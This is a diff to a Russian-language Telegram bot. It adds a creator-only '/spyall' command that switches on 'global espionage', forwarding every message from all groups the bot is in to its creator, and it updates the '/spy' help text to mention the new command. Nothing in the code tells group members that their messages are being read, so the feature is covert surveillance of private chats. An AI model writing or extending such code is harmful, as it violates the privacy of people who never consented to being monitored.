@@ -490,7 +490,7 @@ async def cmd_spy(message: types.Message):
 
     args = message.text.split()
     if len(args) < 2:
-        await message.answer("Укажите ID группы. Пример: <code>/spy -100123456789</code>")
+        await message.answer("Укажите ID группы. Пример: <code>/spy -100123456789</code>\nИли напишите <code>/spyall</code> для шпионажа за ВСЕМИ группами.")
         return
 
     try:
@@ -502,6 +502,19 @@ async def cmd_spy(message: types.Message):
             await message.answer(f"🙈 Режим шпионажа для группы <code>{chat_id}</code> ВЫКЛЮЧЕН.")
     except ValueError:
         await message.answer("ID группы должен быть числом.")
+
+@router.message(Command("spyall"))
+async def cmd_spyall(message: types.Message):
+    if not is_creator(message):
+        return
+
+    from spy import toggle_spy_all
+    is_enabled = await toggle_spy_all()
+    if is_enabled:
+        await message.answer("👁👁 <b>ГЛОБАЛЬНЫЙ ШПИОНАЖ ВКЛЮЧЕН!</b>\nТеперь вы получаете все сообщения ИЗ ВСЕХ ГРУПП, где состоит бот.")
+    else:
+        await message.answer("🙈 <b>Глобальный шпионаж ВЫКЛЮЧЕН.</b>")
+
 
 @router.message(Command("allow"))
 async def cmd_allow(message: types.Message, bot: Bot):
